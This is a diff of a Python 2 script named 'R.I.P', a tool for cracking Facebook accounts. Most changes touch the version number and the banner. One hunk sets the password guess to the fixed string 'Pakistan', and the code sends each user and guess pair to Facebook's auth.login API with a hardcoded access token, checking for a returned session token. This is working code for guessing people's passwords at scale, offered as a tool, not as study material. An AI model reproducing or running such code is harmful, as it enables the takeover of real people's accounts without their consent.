@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 #coding=utf-8
 
-#RIP
-#Version: 1.0
-#Author: Khairul Basar
+#R.I.P
+#Version: 2.0
+#Aurthor: Khairul Basar
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -51,8 +51,8 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-\033[1;96mTool Name \033[1;93m: \033[1;92mRIP
-\033[1;96mVersion   \033[1;93m: \033[1;92m1.0
+\033[1;96mTool Name \033[1;93m: \033[1;92mR.I.P
+\033[1;96mVersion   \033[1;93m: \033[1;92m2.0
 \033[1;96mAuthor    \033[1;93m: \033[1;92mKhairul Basar
 \033[1;96mFacebook  \033[1;93m: \033[1;92m@khb.shuvo
 \033[1;96mGithub    \033[1;93m: \033[1;92m@khairulbasarshuvo
@@ -330,7 +330,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['first_name']+'@#'
+									pass4 = 'Pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
